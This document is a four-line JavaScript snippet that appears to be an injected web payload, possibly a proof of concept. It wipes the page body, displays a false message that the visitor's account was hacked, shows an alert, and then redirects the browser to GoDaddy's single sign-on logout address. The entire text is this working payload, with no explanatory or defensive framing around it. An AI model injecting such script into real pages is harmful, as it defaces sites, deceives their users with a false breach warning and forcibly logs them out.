var x = document.getElementsByTagName('body')[0];
x.innerHTML = '<h1>Sorry but you account was hacked !</h1>';
alert('Now you will be redirected to logout');
document.location = "https://sso.godaddy.com/logout?realm=idp&app=account&path=/";
